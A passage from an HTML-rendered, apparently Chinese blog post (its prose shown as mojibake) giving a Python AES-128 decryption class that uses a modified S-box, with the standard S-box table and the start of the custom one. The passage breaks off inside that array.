class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†å¤±è´¥æˆ–å¡«å……é”™è¯¯ï¼&quot;</span>)<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¿®æ”¹sç›’çš„ä»£ç ï¼Œå¯†æ–‡åªèƒ½16ä½ä¸€ç»„è§£å¯†ï¼Œå¯†æ–‡æŒ‰é¡ºåºæå–unspacedå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">IAES</span>:<br>    <span class="hljs-keyword">global</span> new_s_box<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Nk = <span class="hljs-number">4</span><br>        self.Nb = <span class="hljs-number">4</span><br>        self.Nr = <span class="hljs-number">10</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Nb = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Nb = Nb + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Nb<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Inv_arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Inv_raws = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Inv_raws = Inv_raws + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Inv_raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">self, raws</span>):<br>        raws = self.Inv_arrays(raws)<br>        raws = <span class="hljs-string">&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> raws])<br>        <span class="hljs-built_in">print</span>(raws)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view2</span>(<span class="hljs-params">self, <span class="hljs-built_in">list</span></span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">format</span>(<span class="hljs-built_in">list</span>[i], <span class="hljs-string">&#x27;2x&#x27;</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-keyword">if</span> i &amp; <span class="hljs-number">3</span> == <span class="hljs-number">3</span>:  <span class="hljs-comment"># i%4 == 3</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">AddRoundKey</span>(<span class="hljs-params">self, raws, Keys</span>):<br>        AddRoundKey = []<br>        <span class="hljs-keyword">for</span> raw, Key <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(raws, Keys):<br>            AddRoundKey.append(raw ^ Key)<br>        <span class="hljs-keyword">return</span> AddRoundKey<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubBytes</span>(<span class="hljs-params">self, raws</span>):<br>        S_box=new_s_box<br>        raws_S_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_S_box.append(S_box[raw])<br>        <span class="hljs-keyword">return</span> raws_S_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvSubBytes</span>(<span class="hljs-params">self, raws,inv_s_box</span>):<br>        IS_box = inv_s_box<br>        raws_IS_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_IS_box.append(IS_box[raw])<br>        <span class="hljs-keyword">return</span> raws_IS_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvShiftRows</span>(<span class="hljs-params">self, raws</span>):<br>        s13 = raws.pop(<span class="hljs-number">7</span>)<br>        raws.insert(<span class="hljs-number">4</span>, s13)<br>        s2223 = raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        raws[<span class="hljs-number">8</span>:<span class="hljs-number">0</span>] = s2223<br>        s313233 = raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        raws[<span class="hljs-number">12</span>:<span class="hljs-number">0</span>] = s313233<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GMUL</span>(<span class="hljs-params">self, a, b</span>):  <span class="hljs-comment"># Russian Peasant Multiplication algorithm</span><br>        p = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> a <span class="hljs-keyword">and</span> b:<br>            <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:  <span class="hljs-comment"># b%2</span><br>                p = p ^ a<br>            <span class="hljs-keyword">if</span> a &amp; <span class="hljs-number">0x80</span>:  <span class="hljs-comment"># a=a*x^7(a&gt;0),a &gt;= 2**7(128)</span><br>                a = (a &lt;&lt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0x11b</span>  <span class="hljs-comment"># 0x11b = x^8 + x^4 + x^3 + x + 1 (0b100011011)</span><br>            <span class="hljs-keyword">else</span>:<br>                a = a &lt;&lt; <span class="hljs-number">1</span><br>            b = b &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> p<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvMixColumns</span>(<span class="hljs-params">self, raws</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i] \<br>                = \<br>                self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i])<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">RotWord</span>(<span class="hljs-params">self, temp</span>):<br>        b0 = temp.pop(<span class="hljs-number">0</span>)<br>        temp.insert(<span class="hljs-number">3</span>, b0)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubWord</span>(<span class="hljs-params">self, temp</span>):<br>        temp = self.SubBytes(temp)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyExpansion</span>(<span class="hljs-params">self, key</span>):<br>        i = <span class="hljs-number">0</span><br>        w = [[<span class="hljs-number">0</span>]] * (self.Nb * (self.Nr + <span class="hljs-number">1</span>))<br>        Rcon = [[<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x1B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br>                ]<br>        <span class="hljs-keyword">while</span> i &lt; self.Nk:<br>            w[i] = ([key[<span class="hljs-number">4</span> * i], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]])<br>            i = i + <span class="hljs-number">1</span><br><br>        i = self.Nk<br><br>        <span class="hljs-keyword">while</span> i &lt; self.Nb * (self.Nr + <span class="hljs-number">1</span>):<br>            temp = w[i - <span class="hljs-number">1</span>].copy()<br>            <span class="hljs-keyword">if</span> i % self.Nk == <span class="hljs-number">0</span>:<br>                temp = self.SubWord(self.RotWord(temp))<br>                temp2 = []<br>                <span class="hljs-keyword">for</span> temp1, Rcon1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(temp, Rcon[(i // self.Nk) - <span class="hljs-number">1</span>]):<br>                    temp2.append(temp1 ^ Rcon1)<br>                temp = temp2<br>            <span class="hljs-keyword">elif</span> self.Nk &gt; <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> i % self.Nk == <span class="hljs-number">4</span>:<br>                temp = self.SubWord(temp)<br>            w_temp = []<br>            <span class="hljs-keyword">for</span> w1, temp1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(w[i - self.Nk], temp):<br>                w_temp.append(w1 ^ temp1)<br>            w[i] = w_temp<br>            i = i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> w<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">IAES</span>(<span class="hljs-params">self, IInput, Cipher_Key,inv_s_box</span>):<br>        IInput = [IInput1 <span class="hljs-keyword">for</span> IInput1 <span class="hljs-keyword">in</span> IInput]<br>        Cipher_Key = [Cipher_Key1 <span class="hljs-keyword">for</span> Cipher_Key1 <span class="hljs-keyword">in</span> Cipher_Key]<br>        KeyExpansion = self.KeyExpansion(Cipher_Key)<br>        keys = []<br>        <span class="hljs-keyword">for</span> Key_index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(KeyExpansion) // <span class="hljs-number">4</span>):<br>            keys_temp = (KeyExpansion[<span class="hljs-number">4</span> * Key_index] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">1</span>] + KeyExpansion[<br>                <span class="hljs-number">4</span> * Key_index + <span class="hljs-number">2</span>] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">3</span>])<br>            keys_temp = self.arrays(keys_temp)<br>            keys.append(keys_temp)<br>        IInput = self.arrays(IInput)<br>        self.view(IInput)<br>        self.view(keys[-<span class="hljs-number">1</span>])<br>        IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span>])<br>        self.view(IInput)<br>        <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.Nr - <span class="hljs-number">1</span>):<br>            IInput = self.InvShiftRows(IInput)<br>            self.view(IInput)<br>            IInput = self.InvSubBytes(IInput,inv_s_box)<br>            self.view(IInput)<br>            self.view(keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            self.view(IInput)<br>            IInput = self.InvMixColumns(IInput)<br>            self.view(IInput)<br>        IInput = self.InvShiftRows(IInput)<br>        self.view(IInput)<br>        IInput = self.InvSubBytes(IInput,inv_s_box)<br>        self.view(IInput)<br>        self.view(keys[<span class="hljs-number">0</span>])<br>        IInput = self.AddRoundKey(IInput, keys[<span class="hljs-number">0</span>])<br>        self.view(IInput)<br>        IInput = self.Inv_arrays(IInput)<br>        IInput = <span class="hljs-built_in">bytes</span>(IInput)<br>        <span class="hljs-keyword">return</span> IInput<br><br><br>S_box = [<br>    <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>,<br>    <span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>,<br>    <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>,<br>    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>,<br>    <span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>,<br>    <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>,<br>    <span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>,<br>    <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br>    <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xdb</span>,<br>    <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>,<br>    <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x08</span>,<br>    <span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>,<br>    <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>,<br>    <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>,<br>    <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span><br>]<br><br>new_s_box = [<span class="hljs-number">0x31</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x9B</span>, <span 